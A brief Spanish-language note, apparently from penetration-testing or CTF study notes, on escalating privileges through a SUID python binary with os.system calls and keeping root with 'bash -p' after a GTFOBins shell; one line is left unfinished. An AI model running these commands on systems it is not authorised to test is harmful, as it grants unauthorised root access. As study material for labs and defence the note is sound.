
-------
Si python tiene SUID perms, ejecutamos

python3
import os
os.system("whoami")
os.system("bash")


- Cuándo he conseguido bash con gtfobins y no soy root probar con 
- Esto ejecutará una bash con los máximos privilegios
```bash
bash -p
```